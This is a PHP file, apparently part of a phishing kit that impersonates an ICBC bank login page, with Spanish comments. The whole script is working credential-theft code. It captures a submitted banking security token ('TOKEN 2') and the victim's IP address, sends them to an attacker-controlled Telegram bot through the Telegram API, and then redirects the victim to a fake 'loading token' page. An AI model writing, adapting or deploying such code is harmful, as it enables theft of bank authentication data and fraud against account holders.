<?php

// Lee el contenido del archivo config.json
$config_file_path = '../panel-adm/config.json';
$config_content = file_get_contents($config_file_path);

// Decodifica el contenido JSON en un array asociativo
$config_data = json_decode($config_content, true);

// Verifica si se pudo leer y decodificar correctamente el archivo
if ($config_data === null) {
    die('Error al leer el archivo de configuración.');
}

// Obtiene el token y el chat_id
$token = $config_data['token'];
$chat_id = $config_data['chat_id'];

// Verifica si se recibieron datos mediante POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtiene el nombre y el apellido desde la página anterior
    $user = isset($_POST['rrwf3245']) ? $_POST['rrwf3245'] : '';

    // Obtiene la información adicional (IP, fecha y hora)
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d');
    $hora = date('H:i:s');

    // Construye el mensaje a enviar al bot de Telegram con el diseño personalizado
    $message = "=== LOGIN ICBC ===\n";
    $message .= "👤| TOKEN 2: $user\n";
    $message .= "=====================\n";
    $message .= "📌| IP: $ip\n";
    $message .= "=====================";


    // URL del bot de Telegram para enviar mensajes
    $telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";

    // Datos a enviar al bot de Telegram
    $telegram_data = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];

    // Configuración de la solicitud HTTP
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($telegram_data),
        ],
    ];

    // Realiza la solicitud al bot de Telegram
    $context = stream_context_create($options);
    $result = file_get_contents($telegram_api_url, false, $context);
    // Puedes realizar alguna acción después de enviar los datos a Telegram, si es necesario.
    header("Location: ../cargandotoken.php");
    exit;

}
?>